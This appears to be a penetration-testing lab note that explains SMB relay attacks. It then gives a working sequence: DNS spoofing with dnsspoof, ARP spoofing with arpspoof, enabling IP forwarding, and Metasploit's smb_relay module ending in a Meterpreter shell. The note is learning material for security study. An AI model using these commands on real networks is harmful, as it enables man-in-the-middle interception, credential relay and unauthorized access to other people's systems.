- A SMB Relay Attack is a type of attack where an attacker intercepts SMB traffic, manipulates it and relays it to legitimate server to gain unauthorized access to resources or perform malicious actions.
- This type of attack is common in Windows networks, where SMB is used for file sharing.

- How does it works:
	1. **Interception**: Attacker sets up a Man In The Middle position between client and server. It can be done with ARP spoofing, DNS poisoning or setting up a rogue SMB server.
	2. **Capturing Authentication**: When a client connect to a legitimate server via SMB, it sends authentication data. The attacker captures this data.
	3. **Relaying to a legitimate server**: Attacker relays the NTLM captured to another server that trusts the source. This allows the attacker to impersonate the user whose hash was captured.
	4. **Gain Access**: If the relay is successful, the attacker can gain access to the administrative privileges. This access could lead to further lateral movement.

---

[LAB]

1. Use the smb_relay module in Metasploit
2. Set options
3. Create DNS Poisoning and ARP Spoofing:
```bash
> echo "172.16.5.101 *.sportsfoo.com" > dns  (The ip is the attacker ip)

> dnsspoof -i eth1 -f dns

New TAB

> echo 1 > /etc/sys/net/ipv4/ip_forward
> arpspoof -i eth1 -t 172.16.5.5 172.16.5.1

> arpspoof -i eth1 -t 172.16.5.1 172.16.5.5

Run MSF server.
MSF > sessions (Meterpreter appears)
MSF > sessions 1

meterpreter > getuid 
Shell gained.
```